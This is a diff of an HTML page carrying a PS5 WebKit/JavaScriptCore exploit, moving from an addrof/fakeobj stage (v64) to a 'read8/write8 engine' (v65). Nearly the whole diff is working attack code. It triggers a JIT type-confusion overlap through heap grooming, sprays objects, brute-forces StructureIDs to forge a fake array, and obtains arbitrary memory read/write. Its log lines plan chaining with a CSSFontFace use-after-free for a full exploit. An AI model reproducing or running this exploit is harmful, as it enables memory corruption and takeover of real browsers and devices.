@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - JSC Overlap Exploit (v64)</title>
+<title>PS5 - JSC read8/write8 Engine (v65)</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', 'Courier New', monospace; overflow: hidden; }
@@ -11,6 +11,7 @@ body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', 'Courier N
 .er { color: #ff3333; }
 .hl { color: #00ffff; }
 .mg { color: #ff00ff; font-weight: bold; }
+.wr { color: #ffcc00; }
 </style>
 </head>
 <body>
@@ -22,11 +23,12 @@ function Ok(m) { log("[+] " + m, "ok"); }
 function Fl(m) { log("[-] " + m, "er"); }
 function Hi(m) { log("[*] " + m, "hl"); }
 function St(m) { log("[!] " + m, "mg"); }
+function Wr(m) { log("[!] " + m, "wr"); }
 
-log("=== PS5 JSC Type Confusion Exploit (v64) ===\n");
+log("=== PS5 JSC read8/write8 Engine (v65) ===\n");
 
 try {
-    Hi("Initializing JSC Overlap...");
+    Hi("Phase 1: JSC Overlap Setup...");
     
     var arr = new Array(0x40_0000).fill(1.1);
     var arr_index = arr.length - 1;
@@ -38,18 +40,15 @@ try {
         let forGC = [];
         let a = new Date(1111);
         a[0] = 1.1;
-
         for (let j = 0; j < allocCount; ++j) {
             let arr = new ArrayBuffer(0x80_0000);
             forGC.push(arr);
         }
-
         A.p2 = forGC;
         let b = { p0: 0x42424242, p1: 1.1 };
         let f = b;
         if (flag) { f = 1.1; }
         A.p1 = f;
-        
         let v = 1.1;
         for (let i = 0; i < 1e6; ++i) {
             for (let j = 0; j < k; ++j) { v = i; v = j; }
@@ -64,77 +63,244 @@ try {
         recursive(n - 1);
     }
 
-    function main() {
-        Hi("Phase 1: JIT Warmup (This may take a few seconds)...");
-        foo(true, 1, 1);
-        foo(false, 1, 1);
-        for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
-        Ok("JIT Warmup complete.");
+    // JIT warmup
+    Hi("JIT Warmup...");
+    foo(true, 1, 1);
+    foo(false, 1, 1);
+    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
+    for (let i = 0; i < 10000; i++) recursive(i);
+    Ok("JIT Warmup complete.");
 
-        Hi("Phase 2: Stack Manipulation...");
-        for (let i = 0; i < 10000; i++) recursive(i);
-        Ok("Stack manipulated.");
+    // Trigger overlap
+    Hi("Triggering Type Confusion...");
+    var overlapFound = false;
+    var boxed_arr, unboxed_arr;
+    
+    for (let k = 0; k < 10000 && !overlapFound; ++k) {
+        foo(false, 10, k % 5 + 1);
+        recursive(10000);
+        for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
 
-        Hi("Phase 3: Triggering Overlap...");
-        for (let k = 0; k < 10000; ++k) {
-            foo(false, 10, k % 5 + 1);
-            recursive(10000);
-
-            for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
-
-            let freed = arr[arr_index].p1.p1;
-            let noCow = 13.37;
-            let win = false;
-            
-            for (let i = 0; i < 16; ++i) {
-                let arr2 = [13.37, 2.2, 3.3, 4.4, noCow]; 
-                reclaimed.push(arr2);
-                if (freed[0] === 13.37) { 
-                    win = true;
-                    break;
-                }
+        let freed = arr[arr_index].p1.p1;
+        let noCow = 13.37;
+        
+        for (let i = 0; i < 16; ++i) {
+            let arr2 = [13.37, 2.2, 3.3, 4.4, noCow]; 
+            reclaimed.push(arr2);
+            if (freed[0] === 13.37) { 
+                overlapFound = true;
+                boxed_arr = reclaimed[reclaimed.length - 1];
+                boxed_arr[0] = {};
+                unboxed_arr = freed;
+                break;
             }
-
-            if (!win) continue;
-
-            St("OVERLAP DETECTED! Type Confusion Successful!");
-            
-            let boxed_arr = reclaimed[reclaimed.length - 1];
-            boxed_arr[0] = {};
-            let unboxed_arr = freed;
-
-            let ab = new ArrayBuffer(8);
-            let u64 = new BigUint64Array(ab);
-            let f64 = new Float64Array(ab);
-
-            function itof(value) { u64[0] = value; return f64[0]; }
-            function ftoi(f) { f64[0] = f; return u64[0]; }
-
-            function addrof(obj) {
-                boxed_arr[0] = obj;
-                return ftoi(unboxed_arr[0]);
-            }
-
-            function fakeobj(addr) {
-                unboxed_arr[0] = itof(addr);
-                return boxed_arr[0];
-            }
-
-            let testObj = { p0: 1.1 };
-            let addr = addrof(testObj);
-            
-            Ok("addrof({p0:1.1}) = 0x" + addr.toString(16));
-            St("JSC EXPLOIT SUCCESSFUL! We have addrof/fakeobj.");
-            
-            return;
         }
-        Fl("Overlap failed after 10000 iterations.");
     }
 
-    main();
+    if (!overlapFound) {
+        Fl("Overlap failed!");
+        throw "No overlap";
+    }
+
+    St("OVERLAP DETECTED!");
+    
+    // Build addrof/fakeobj
+    let ab = new ArrayBuffer(8);
+    let u64 = new BigUint64Array(ab);
+    let f64 = new Float64Array(ab);
+
+    function itof(value) { u64[0] = value; return f64[0]; }
+    function ftoi(f) { f64[0] = f; return u64[0]; }
+
+    function addrof(obj) {
+        boxed_arr[0] = obj;
+        return ftoi(unboxed_arr[0]);
+    }
+
+    function fakeobj(addr) {
+        unboxed_arr[0] = itof(addr);
+        return boxed_arr[0];
+    }
+
+    // Test addrof
+    let testObj = { p0: 1.1 };
+    let testAddr = addrof(testObj);
+    Ok("addrof test: 0x" + testAddr.toString(16));
+
+    // ============================================================
+    // Phase 2: Build read8/write8
+    // ============================================================
+    Hi("\nPhase 2: Building read8/write8...");
+    
+    // Spray objects with predictable spacing
+    Hi("Spraying objects for adjacent pair...");
+    let spray = [];
+    for (let i = 0; i < 500; ++i) {
+        spray.push({ p1: 1.1, p2: 2.2 });
+    }
+    
+    // Find adjacent pair (0x20 apart)
+    let objA = null, objB = null, objA_addr = 0n;
+    for (let i = 1; i < spray.length; ++i) {
+        let prev = addrof(spray[i-1]);
+        let curr = addrof(spray[i]);
+        if (curr - prev === 0x20n) {
+            objA = spray[i-1];
+            objB = spray[i];
+            objA_addr = prev;
+            Ok("Found adjacent pair at 0x" + objA_addr.toString(16));
+            break;
+        }
+    }
+    
+    if (!objA) {
+        Fl("No adjacent pair found!");
+        throw "No adjacent pair";
+    }
+    
+    // Create fake array at objA_addr + 0x10
+    // fake_arr.JSCell = objA.p1 (at objA_addr + 0x10)
+    // fake_arr.butterfly = objA.p2 (at objA_addr + 0x18)
+    let fake_arr = fakeobj(objA_addr + 0x10n);
+    
+    // Known array for validation
+    let known = [13.37, 2.2, 3.3, 4.4];
+    let known_addr = addrof(known);
+    Hi("Known array at: 0x" + known_addr.toString(16));
+    
+    // Brute force StructureID
+    // JSCell for ArrayWithDouble: structID | 0x0024070000000000
+    // Try structID 0-512, and try different butterfly offsets
+    Hi("Brute forcing StructureID...");
+    
+    let foundStruct = false;
+    let foundStructID = 0n;
+    let foundOffset = 0n;
+    
+    // Common offsets from JSCell to butterfly data
+    let offsets = [0x00n, 0x08n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n, 0x38n, 0x40n, 0x48n, 0x50n, 0x58n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n];
+    
+    for (let sid = 0; sid < 512 && !foundStruct; ++sid) {
+        let cellVal = BigInt(sid) | 0x0024070000000000n;
+        
+        try {
+            objA.p1 = itof(cellVal);
+            
+            for (let oi = 0; oi < offsets.length; ++oi) {
+                let off = offsets[oi];
+                objA.p2 = itof(known_addr + off);
+                
+                try {
+                    let val = fake_arr[0];
+                    if (val === 13.37) {
+                        foundStruct = true;
+                        foundStructID = cellVal;
+                        foundOffset = off;
+                        St("FOUND! StructureID=" + sid + " Offset=0x" + off.toString(16));
+                        break;
+                    }
+                } catch(e2) {}
+            }
+        } catch(e) {}
+    }
+    
+    if (!foundStruct) {
+        // Try with different IndexingType values
+        Wr("Standard ArrayWithDouble failed. Trying alternate types...");
+        
+        let altTypes = [
+            0x0024030000000000n, // ArrayWithContiguous
+            0x0024060000000000n, // ArrayWithInt32
+            0x0024080000000000n, // ArrayWithArrayStorage
+        ];
+        
+        for (let ti = 0; ti < altTypes.length && !foundStruct; ++ti) {
+            for (let sid = 0; sid < 512 && !foundStruct; ++sid) {
+                let cellVal = BigInt(sid) | altTypes[ti];
+                
+                try {
+                    objA.p1 = itof(cellVal);
+                    
+                    for (let oi = 0; oi < offsets.length; ++oi) {
+                        let off = offsets[oi];
+                        objA.p2 = itof(known_addr + off);
+                        
+                        try {
+                            let val = fake_arr[0];
+                            // For ArrayWithContiguous, values are boxed
+                            // Check if val is 13.37 or an object
+                            if (typeof val === 'number' && val === 13.37) {
+                                foundStruct = true;
+                                foundStructID = cellVal;
+                                foundOffset = off;
+                                St("FOUND! Type=0x" + altTypes[ti].toString(16) + " SID=" + sid + " Off=0x" + off.toString(16));
+                                break;
+                            }
+                        } catch(e2) {}
+                    }
+                } catch(e) {}
+            }
+        }
+    }
+    
+    if (!foundStruct) {
+        Fl("Could not find valid StructureID!");
+        throw "No structure";
+    }
+    
+    // ============================================================
+    // Phase 3: read8/write8 primitives
+    // ============================================================
+    Hi("\nPhase 3: Building read8/write8...");
+    
+    // Set up the fake array with found StructureID
+    objA.p1 = itof(foundStructID);
+    
+    function read8(addr) {
+        objA.p2 = itof(addr);
+        return ftoi(fake_arr[0]);
+    }
+    
+    function write8(addr, val) {
+        objA.p2 = itof(addr);
+        fake_arr[0] = itof(val);
+    }
+    
+    // Test read8: read known array's JSCell header
+    let jscell = read8(known_addr);
+    Ok("read8(known_addr) = 0x" + jscell.toString(16));
+    
+    // Test read8: read known array's butterfly pointer
+    let butterfly_ptr = read8(known_addr + 0x08n);
+    Ok("read8(known_addr+0x08) = 0x" + butterfly_ptr.toString(16));
+    
+    // Test read8: read first element (should be 13.37)
+    let elem0 = read8(butterfly_ptr);
+    Ok("read8(butterfly) = " + itof(elem0) + " (expected 13.37)");
+    
+    // Test write8: write to first element
+    write8(butterfly_ptr, ftoi(99.99));
+    let new_val = known[0];
+    Ok("write8 test: known[0] = " + new_val + " (expected 99.99)");
+    
+    // ============================================================
+    // Phase 4: Full R/W achieved!
+    // ============================================================
+    Hi("\nPhase 4: Summary");
+    St("★ read8/write8 ACHIEVED! ★");
+    Ok("addrof:  ✅");
+    Ok("fakeobj: ✅");
+    Ok("read8:   ✅");
+    Ok("write8:  ✅");
+    Ok("StructureID: 0x" + foundStructID.toString(16));
+    Ok("Butterfly offset: 0x" + foundOffset.toString(16));
+    
+    Hi("\nNext: Corrupt Float64Array m_vector for fast R/W");
+    Hi("Then: Combine with CSSFontFace UAF for full exploit");
 
 } catch(e) {
     Fl("CRASH: " + e.message);
+    log(e.stack || "");
 }
 </script>
 </body>
